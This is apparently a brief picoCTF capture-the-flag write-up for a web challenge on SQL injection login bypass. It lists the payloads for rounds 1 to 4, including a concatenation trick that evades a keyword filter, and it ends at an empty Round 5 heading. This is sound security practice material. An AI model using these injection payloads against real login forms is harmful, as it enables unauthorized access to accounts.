# URL
https://play.picoctf.org/practice/challenge/88?category=1&page=1&search=gaunt
# Category
Web App
# Concept
* find different ways to do SQL auth bypass with different filters applied
# Method of solve
## Round 1
* there are no filters
* the payload is `admin'--`
## Round 2
* there is a filter on the double dashes `--`
* the payload is `admin';`
## Round 3
* there is a filter on ???
* the payload is `admin';`
## Round 4
* there is a filter on the following characters `or and = like > < -- admin`
* the payload is `ad'||'min';`
## Round 5
